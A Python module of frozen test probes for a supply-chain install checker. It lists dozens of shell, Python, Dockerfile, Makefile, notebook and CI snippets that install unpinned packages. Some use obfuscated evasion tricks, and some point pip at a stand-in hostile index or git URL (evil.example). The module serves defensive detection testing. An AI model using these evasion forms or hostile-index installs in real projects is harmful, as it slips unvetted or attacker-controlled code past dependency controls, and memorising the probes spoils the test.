"""The 94 probe statements of reviews r2 (b1_probe) and r3 (r3_probe), as synthetic files.

(id, path, file text). Each must be RED under G4-CP when judged alone. Frozen data; never executed.
"""

from __future__ import annotations

PROBES: tuple[tuple[str, str, str], ...] = (
    (
        "r1-requirement-eq",
        "x.sh",
        "pip install --no-deps --no-build-isolation --requirement=requirements-unpinned.txt .\n",
    ),
    (
        "r1-attached-r",
        "x.sh",
        "pip install --no-deps --no-build-isolation -rrequirements-unpinned.txt .\n",
    ),
    (
        "r1-editable-eq-url",
        "x.sh",
        "pip install --no-deps --no-build-isolation --editable=git+https://evil.example/x.git .\n",
    ),
    ("r1-pip-bin-var", "x.sh", '"${PIP_BIN}" install fastapi\n'),
    ("r1-uv-run-with", "x.sh", "uv run --with fastapi python x.py\n"),
    (
        "requirement-space",
        "x.sh",
        "pip install --no-deps --no-build-isolation --requirement requirements-unpinned.txt .\n",
    ),
    (
        "r-eq",
        "x.sh",
        "pip install --no-deps --no-build-isolation -r=requirements-unpinned.txt .\n",
    ),
    (
        "quoted-requirement",
        "x.sh",
        "pip install --no-deps --no-build-isolation '--requirement=requirements-unpinned.txt' .\n",
    ),
    ("python-m-pip", "x.sh", "python -m pip install fastapi\n"),
    ("pip3", "x.sh", "pip3 install fastapi\n"),
    ("uv-pip-install", "x.sh", "uv pip install fastapi\n"),
    ("pipx", "x.sh", "pipx install semgrep\n"),
    (
        "constraint-eq",
        "x.sh",
        "pip install --no-deps --no-build-isolation --constraint=requirements-unpinned.txt .\n",
    ),
    (
        "N1-clustered-qr",
        "x.sh",
        "pip install --no-deps --no-build-isolation -qr requirements-unpinned.txt .\n",
    ),
    (
        "N2-clustered-qr-attached",
        "x.sh",
        "pip install --no-deps --no-build-isolation -qrrequirements-unpinned.txt .\n",
    ),
    ("N4-python-mpip-attached", "x.sh", "python3 -mpip install fastapi\n"),
    ("N5-pip3.12", "x.sh", "pip3.12 install fastapi\n"),
    ("N6-venv-pip3.12", "x.sh", ".venv/bin/pip3.12 install fastapi\n"),
    ("N7-global-opt-before-install", "x.sh", "pip --no-cache-dir install fastapi\n"),
    ("N8-pip-q-install", "x.sh", "pip -q install fastapi\n"),
    ("N9-python-m-pip-global-opt", "x.sh", "python -m pip -q install fastapi\n"),
    ("N10-make-paren-PIP", "x.sh", "$(PIP) install fastapi\n"),
    ("N11-dollar-VENV-bin-pip", "x.sh", "$VENV/bin/pip install fastapi\n"),
    ("N12-braced-VENV-bin-pip", "x.sh", "${VENV}/bin/pip install fastapi\n"),
    ("N13-backticks", "x.sh", "X=`pip install fastapi`\n"),
    ("N14-echo-cmdsubst", "x.sh", 'echo "$(pip install fastapi)"\n'),
    (
        "N15-py-list",
        "x.py",
        'subprocess.run(["pip", "install", "fastapi"], check=True)\n',
    ),
    (
        "N16-py-list-m-pip",
        "x.py",
        'subprocess.run([sys.executable, "-m", "pip", "install", "fastapi"])\n',
    ),
    ("N17-docker-exec-form", "Dockerfile", 'RUN ["pip", "install", "fastapi"]\n'),
    ("N18-uv-global-opt-pip", "x.sh", "uv --quiet pip install fastapi\n"),
    ("N19-uv-global-opt-run-with", "x.sh", "uv --offline run --with fastapi x.py\n"),
    ("N20-uv-tool-global-opt", "x.sh", "uv -q tool install ruff\n"),
    (
        "N21-env-PIP_REQUIREMENT",
        "x.sh",
        "PIP_REQUIREMENT=requirements-unpinned.txt pip install --no-deps --no-build-isolation .\n",
    ),
    (
        "N22-env-PIP_EDITABLE",
        "x.sh",
        "PIP_EDITABLE=git+https://evil.example/x.git pip install --no-deps --no-build-isolation .\n",
    ),
    (
        "N23-index-url-redirect",
        "x.sh",
        "pip install --no-deps --no-build-isolation --index-url=https://evil.example/simple .\n",
    ),
    (
        "N24-find-links",
        "x.sh",
        "pip install --no-deps --no-build-isolation --find-links=./w .\n",
    ),
    (
        "N25-hashed-plus-extra-positional",
        "x.sh",
        "pip install --require-hashes --only-binary=:all: -r requirements.txt fastapi\n",
    ),
    ("N26-conda", "x.sh", "conda install fastapi\n"),
    ("N27-easy_install", "x.sh", "easy_install fastapi\n"),
    ("N28-setup-py-install", "x.sh", "python setup.py install\n"),
    ("N29-pip-sudo", "x.sh", "sudo pip install fastapi\n"),
    (
        "P1-py-list-name-element-extra-pkg",
        "x.py",
        "import subprocess, sys\n"
        'extra = "fastapi"\n'
        'subprocess.run([sys.executable, "-m", "pip", "install", "--no-deps", "--no-build-isolation", '
        '".", extra])\n',
    ),
    (
        "P2-py-list-pip-path-variable",
        "x.py",
        "import subprocess\n"
        'pip = ".venv/bin/python"\n'
        'subprocess.run([pip, "-m", "piq".replace("q","p"), "install", "fastapi"])\n',
    ),
    (
        "P3-py-list-PIP-name-first",
        "x.py",
        'import subprocess\nPIP = ".venv/bin/pip"\nsubprocess.run([PIP, "install", "fastapi"])\n',
    ),
    (
        "P4-py-concat-literals",
        "x.py",
        'import os\nos.system("pip " + "install fastapi")\n',
    ),
    (
        "P5-py-fstring-pkg",
        "x.py",
        'import os\npkg="fastapi"\nos.system(f"pip install {pkg}")\n',
    ),
    (
        "P6-py-fstring-verb-split",
        "x.py",
        'import os\nv="install"\nos.system(f"pip {v} fastapi")\n',
    ),
    (
        "P7-py-backtick-in-shell-string",
        "x.py",
        'import subprocess\nsubprocess.run("echo `pip install fastapi`", shell=True)\n',
    ),
    (
        "P8-py-backtick-assign",
        "x.py",
        'import os\nos.system("X=`pip install fastapi`; echo $X")\n',
    ),
    (
        "P9-py-pip-internal-main",
        "x.py",
        'from pip._internal.cli.main import main\nmain(["install", "fastapi"])\n',
    ),
    (
        "P10-py-runpy-pip",
        "x.py",
        "import runpy, sys\n"
        'sys.argv = ["pip", "install", "fastapi"]\n'
        'runpy.run_module("pip", run_name="__main__")\n',
    ),
    (
        "P11-py-split-cmd",
        "x.py",
        'import subprocess\ncmd = "pip install fastapi"\nsubprocess.run(cmd.split())\n',
    ),
    (
        "P12-py-list-plus-name",
        "x.py",
        "import subprocess\n"
        'subprocess.run(["pip", "install", "--no-deps", "--no-build-isolation", "."] + EXTRA)\n',
    ),
    (
        "P13-py-starred",
        "x.py",
        "import subprocess\n"
        'subprocess.run(["pip", "install", "--no-deps", "--no-build-isolation", ".", *EXTRA])\n',
    ),
    ("S1-ansi-c-quoted-verb", "x.sh", "pip $'install' fastapi\n"),
    ("S2-verb-in-variable", "x.sh", "V=install\npip $V fastapi\n"),
    (
        "S3-make-var-sanctioned-prefix",
        "Makefile",
        "INSTALL = pip install --no-deps --no-build-isolation .\nall:\n\t$(INSTALL) fastapi\n",
    ),
    (
        "S4-sh-var-sanctioned-prefix-unquoted",
        "x.sh",
        "INSTALL=pip\n$INSTALL install fastapi\n",
    ),
    (
        "S5-xargs-appends",
        "x.sh",
        "xargs -a extra.txt pip install --no-deps --no-build-isolation .\n",
    ),
    (
        "S6-pipe-xargs",
        "x.sh",
        "cat extra.txt | xargs pip install --no-deps --no-build-isolation .\n",
    ),
    ("S7-python-Impip", "x.sh", "python3 -Impip install fastapi\n"),
    (
        "S8-python-m-pip-dunder-main",
        "x.sh",
        "python3 -m pip.__main__ install fastapi\n",
    ),
    ("S9-pip-dash-3.12", "x.sh", "pip-3.12 install fastapi\n"),
    (
        "S10-pip-config-set-requirement",
        "x.sh",
        "pip config --site set install.requirement extra.txt\n"
        "pip install --no-deps --no-build-isolation .\n",
    ),
    (
        "S11-pip-conf-written",
        "Dockerfile",
        "RUN printf '[install]\\nrequirement = /extra.txt\\n' > /etc/pip.conf\n"
        "RUN pip install --no-deps --no-build-isolation .\n",
    ),
    ("S12-uv-run-plain-syncs-project", "x.sh", "uv run pytest\n"),
    ("S13-uv-run-script-inline-deps", "x.sh", "uv run scripts/tool.py\n"),
    ("S14-uv-venv-seed", "x.sh", "uv venv --seed .venv\n"),
    ("S15-uv-build", "x.sh", "uv build\n"),
    ("S16-pipenv", "x.sh", "pipenv install fastapi\n"),
    ("S17-poetry", "x.sh", "poetry add fastapi\n"),
    (
        "S18-ipynb-bang-pip",
        "nb.ipynb",
        '{"cells":[{"cell_type":"code","source":["!pip install fastapi\\n"]}]}\n',
    ),
    (
        "S19-ipynb-magic-pip",
        "nb.ipynb",
        '{"cells":[{"cell_type":"code","source":["%pip install fastapi\\n"]}]}\n',
    ),
    (
        "S20-nox-session-install",
        "noxfile.py",
        'import nox\n@nox.session\ndef t(session):\n    session.install("fastapi")\n',
    ),
    ("S21-tox-deps", "tox.ini", "[testenv]\ndeps = fastapi\ncommands = pytest\n"),
    (
        "S22-hashed-other-file",
        "x.sh",
        "pip install --require-hashes --only-binary=:all: -r extras-hashed.txt\n",
    ),
    ("S23-pip-wheel-then-hashed", "x.sh", "pip wheel fastapi -w w\n"),
    ("S24-pip-download", "x.sh", "pip download fastapi -d w\n"),
    ("S25-ensurepip", "x.sh", "python -m ensurepip --upgrade\n"),
    (
        "S26-PIP_INDEX_URL-env",
        "x.sh",
        "PIP_INDEX_URL=https://evil.example/simple pip install --no-deps --no-build-isolation .\n",
    ),
    ("S27-pip-uppercase-verb", "x.sh", "pip INSTALL fastapi\n"),
    ("S28-exec-env-S", "x.sh", "env -S 'pip install fastapi'\n"),
    ("S29-sh-c-string", "x.sh", "sh -c 'pip install fastapi'\n"),
    ("S30-bash-heredoc-stdin", "x.sh", "bash <<'X'\npip install fastapi\nX\n"),
    (
        "S31-yaml-literal-run",
        "w.yml",
        "jobs:\n  t:\n    steps:\n      - run: |\n          pip install \\\n            fastapi\n",
    ),
    ("S32-make-define-block", "Makefile", "define INST\npip install fastapi\nendef\n"),
    (
        "S33-dockerfile-shell-form-json-sh",
        "Dockerfile",
        'RUN ["/bin/sh", "-c", "pip install fastapi"]\n',
    ),
    (
        "S34-toml-script",
        "pyproject.toml",
        '[tool.poe.tasks]\nsetup = "pip install fastapi"\n',
    ),
    (
        "S35-js-execSync",
        "x.js",
        'require("child_process").execSync("pip install fastapi")\n',
    ),
    (
        "S36-py-pip-main-via-importlib",
        "x.py",
        "import importlib\n"
        'importlib.import_module("pip._internal.cli.main").main(["install","fastapi"])\n',
    ),
    ("S37-uv-pip-install-quoted-sub", "x.sh", "uv 'pip' 'install' fastapi\n"),
    ("S38-dollar-brace-default", "x.sh", "${PIPX:-pip} install fastapi\n"),
    (
        "S39-command-substitution-pip-path",
        "x.sh",
        "$(command -v pip) install fastapi\n",
    ),
    ("S40-which-pip", "x.sh", "`which pip` install fastapi\n"),
)
